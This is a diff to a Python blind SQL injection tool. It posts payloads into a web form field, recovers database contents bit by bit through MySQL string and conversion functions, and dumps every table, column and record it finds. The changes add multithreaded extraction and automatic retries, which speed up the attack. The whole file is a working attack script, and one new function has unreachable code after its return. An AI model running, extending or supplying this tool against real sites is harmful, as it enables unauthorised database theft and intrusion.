@@ -1,25 +1,31 @@
 #!/usr/bin/python3
 
-import urllib.parse, urllib.request, time, math, argparse, sys
+import urllib.parse, urllib.request, time, math, argparse, sys, concurrent.futures
+#from concurrent.futures import *
 
 DEFAULT_DELAY=0
+
+MAX_THREADS=1
+tableExecutor = None
+stringExecutor = None
+charExecutor = None
+
 
 class Printer:
 
     def __init__(self, verbosity=0, outfile=None):
         self.verbosity = verbosity
         self.outfile = outfile
-        self.indent=0
 
-    def print(self, str, req_verbosity=0):
+    def print(self, str, req_verbosity=0, indent=0):
         if self.verbosity >= req_verbosity:
-            print(('\t'*self.indent)+str)
+            print(('\t'*indent)+str)
 
-    def printToFile(self, str):
+    def printToFile(self, str, indent=0):
         if self.outfile is None:
-            print(('\t'*self.indent)+str)
+            print(('\t'*indent)+str)
         else:
-            self.outfile.write(('\t'*self.indent)+str+'\n')
+            self.outfile.write(('\t'*indent)+str+'\n')
 
 
 
@@ -33,12 +39,16 @@ class Injector:
         self.other_fields = other_fields
 
     def post(self, data):
-        req = urllib.request.urlopen(urllib.request.Request(self.url, urllib.parse.urlencode(data).encode('ascii')));
+        req = None
+        while req is None:
+            try:
+                req = urllib.request.urlopen(urllib.request.Request(self.url, urllib.parse.urlencode(data).encode('ascii')));
+            except urllib.error.URLError:
+                pass
         return req.read().decode(req.headers.get_content_charset())
 
     def runInjection(self, inj):
         time.sleep(self.delay)
-        PRINTER.print('Injecting: %s' % inj, 3)
         data = self.other_fields.copy()
         data[self.attack_field] = inj
         res = self.post(data)
@@ -74,22 +84,19 @@ class Injector:
         return self.getNumber("LENGTH((%s))" % obj)
 
     def getChar(self, obj, index):
-        binstr = ""
-        for i in range(1, 8):
-            binstr += ("1" if self.checkBit("SUBSTR(LPAD(CONV(HEX(SUBSTR((%s), %d, 1)), 16, 2), 7, 0), %d, 1)"
-                                            % (obj, index, i))
-                       else "0")
+        binstr = ''.join(list(charExecutor.map(
+            (lambda x: "1" if
+             self.checkBit("SUBSTR(LPAD(CONV(HEX(SUBSTR((%s), %d, 1)), 16, 2), 7, 0), %d, 1)"
+                           % (obj, index, x))
+             else "0"), range(1, 8))))
         c = int(binstr, 2).to_bytes(15//8, 'big').decode()
-        PRINTER.print("Found character: %c" % c, 2)
         return c
 
     def getString(self, obj):
-        PRINTER.print("Getting string length...", 2)
         namelen = self.getLen(obj)
-        PRINTER.print("Found string length of %d" % namelen, 2)
-        name = ""
-        for x in range(1, namelen+1):
-            name += self.getChar(obj, x)
+        name = ''.join(list(stringExecutor.map(
+            (lambda x: self.getChar(obj, x)),
+            range(1, namelen+1))))
         return name
 
     def getDataFromTable(self, column, table, index=0, where="1=1"):
@@ -124,23 +131,26 @@ class Database:
         return self.injector.getDataFromTable('table_name', self.tables_table, tableIndex, self.table_filter)
 
     def getTableSchema(self, tableIndex):
-        return self.injector.getDataFromTable('table_schema', self.tables_table, tableIndex, self.table_filter)            
+        return self.injector.getDataFromTable('table_schema', self.tables_table, tableIndex, self.table_filter)
+
+    def getTable(self, index, populateTable=False):
+        PRINTER.print("Getting name of table %d" % index, 2)
+        name = self.getTableName(index)
+        PRINTER.print("Got table name: %s" % name, 2)
+        schema = self.getTableSchema(index)
+        PRINTER.print("Got table schema: %s" % schema, 2)
+        PRINTER.print("Building table: %s (schema: %s)" % (name, schema), 1)
+        table = Table(self.injector, name, schema, self.columns_table)
+        if populateTable:
+            table.populate()
+        return table
+        self.tables.append(table)
         
     def findTables(self, populateTables=False):
         PRINTER.print("Getting table count...", 1)
         count = self.getTableCount()
         PRINTER.print("Counted %d tables" % count, 1)
-        for i in range(count):
-            PRINTER.print("Getting name of table %d" % i, 2)
-            name = self.getTableName(i)
-            PRINTER.print("Got table name: %s" % name, 2)
-            schema = self.getTableSchema(i)
-            PRINTER.print("Got table schema: %s" % schema, 2)
-            PRINTER.print("Building table: %s (schema: %s)" % (name, schema), 1)
-            table = Table(self.injector, name, schema, self.columns_table)
-            if populateTables:
-                table.populate()
-            self.tables.append(table)
+        self.tables.extend(list(tableExecutor.map(lambda x: self.getTable(x, populateTables), range(count))))
 
         
 
@@ -157,11 +167,9 @@ class Table:
         self.columns_table = columns_table
 
     def populate(self, where=None):
-        PRINTER.indent = 1
         self.findColumns()
         PRINTER.print("", 1)
         self.findRecords(where)
-        PRINTER.indent = 0
 
     def getColumnCount(self):
         if self.columns_table is not None:
@@ -176,12 +184,12 @@ class Table:
             return ''
 
     def findColumns(self):
-        PRINTER.print("Getting column count...", 1)
+        PRINTER.print("Getting column count...", 1, 1)
         count = self.getColumnCount()
-        PRINTER.print("Found %d columns" % count)
+        PRINTER.print("Found %d columns" % count, 1, 1)
         for i in range(count):
             name = self.getColumnName(i)
-            PRINTER.print("Got column name: %s" % name, 1)
+            PRINTER.print("Got column name: %s" % name, 1, 1)
             self.columns.append(name)
 
 
@@ -192,14 +200,14 @@ class Table:
         return self.injector.getDataFromTable(column, self, recordIndex, where)
 
     def findRecords(self, where=None):
-        PRINTER.print("Getting record count...", 1)
+        PRINTER.print("Getting record count...", 1, 1)
         count = self.getRecordCount(where)
-        PRINTER.print("Found %d records" % count)
+        PRINTER.print("Found %d records" % count, 1, 1)
         for i in range(count):
             record = Record(self)
             for col in self.columns:
                 data = self.getRecordData(i, col, where)
-                PRINTER.print("Found value '%s'=>'%s' for record %d" % (col, data, i), 1)
+                PRINTER.print("Found value '%s'=>'%s' for record %d" % (col, data, i), 1, 2)
                 record.setData(col, data)
             PRINTER.print("", 1)
             self.records.append(record)
@@ -269,7 +277,8 @@ class Parser:
         parser.add_argument('--fieldlte', nargs=2, action=TableFieldsAction, help=argparse.SUPPRESS)
         parser.add_argument('--fieldgte', nargs=2, action=TableFieldsAction, help=argparse.SUPPRESS)
 
-        
+        parser.add_argument('-n', '--max_threads', type=int, help="Maximum number of threads to spawn. Default: %(default)s", default=MAX_THREADS)
+
         self.args = parser.parse_args()
 
     def parseOtherFields(self):
@@ -306,36 +315,41 @@ class Parser:
         where += self.parseFieldArgs(self.args.fieldgte, "%s >= %s")
         return where[:-5]
 
+if __name__ == '__main__':
+    p = Parser()
 
+    tableExecutor = concurrent.futures.ThreadPoolExecutor(max_workers=max(math.floor(p.args.max_threads*0.05), 1))
+    stringExecutor = concurrent.futures.ThreadPoolExecutor(max_workers=max(math.floor(p.args.max_threads*0.2), 1))
+    charExecutor = concurrent.futures.ThreadPoolExecutor(max_workers=max(math.floor(p.args.max_threads*0.75), 1))
+    
+    verbosity = 0 if p.args.verbose is None else p.args.verbose
+    PRINTER = Printer(verbosity, p.args.outfile)
 
-p = Parser()
-
-verbosity = 0 if p.args.verbose is None else p.args.verbose
-PRINTER = Printer(verbosity, p.args.outfile)
-
-delay = DEFAULT_DELAY if p.args.delay is None else p.args.delay
-injector = Injector(p.args.url, p.args.success, delay, p.args.attack_field, p.parseOtherFields())
-db = Database(injector)
-if p.args.dump_table is None:
-    db.findTables(not p.args.tables_only)
-else:
-    s = p.args.dump_table.split(".")
-    if len(s) == 1:
-        print("Dumping table %s" % s[0])
-        table = Table(injector, s[0], db.default_schema, db.columns_table)
+    delay = DEFAULT_DELAY if p.args.delay is None else p.args.delay
+    injector = Injector(p.args.url, p.args.success, delay, p.args.attack_field, p.parseOtherFields())
+    db = Database(injector)
+    if p.args.dump_table is None:
+        db.findTables(not p.args.tables_only)
     else:
-        print("Dumping table %s.%s" % (s[0], s[1]))
-        table = Table(injector, s[1], s[0], db.columns_table)
-    table.populate(p.parseWhere())
-    db.tables.append(table)
+        s = p.args.dump_table.split(".")
+        if len(s) == 1:
+            print("Dumping table %s" % s[0])
+            table = Table(injector, s[0], db.default_schema, db.columns_table)
+        else:
+            print("Dumping table %s.%s" % (s[0], s[1]))
+            table = Table(injector, s[1], s[0], db.columns_table)
+        table.populate(p.parseWhere())
+        db.tables.append(table)
 
-PRINTER.printToFile("========== DATABASE DUMP ==========")
-for table in db.tables:
-    PRINTER.printToFile("======= TABLE: %s.%s" % (table.schema, table.name))
-    PRINTER.indent = 1
-    for record in table.records:
-        for column, value in record.data.items():
-            PRINTER.printToFile("%s: %s" % (column, value))
+    PRINTER.printToFile("========== DATABASE DUMP ==========")
+    for table in db.tables:
+        PRINTER.printToFile("======= TABLE: %s.%s" % (table.schema, table.name))
+        for record in table.records:
+            for column, value in record.data.items():
+                PRINTER.printToFile("%s: %s" % (column, value), 1)
+            PRINTER.printToFile("")
         PRINTER.printToFile("")
-    PRINTER.printToFile("")
-    PRINTER.indent = 0
+
+tableExecutor.shutdown()
+stringExecutor.shutdown()
+charExecutor.shutdown()
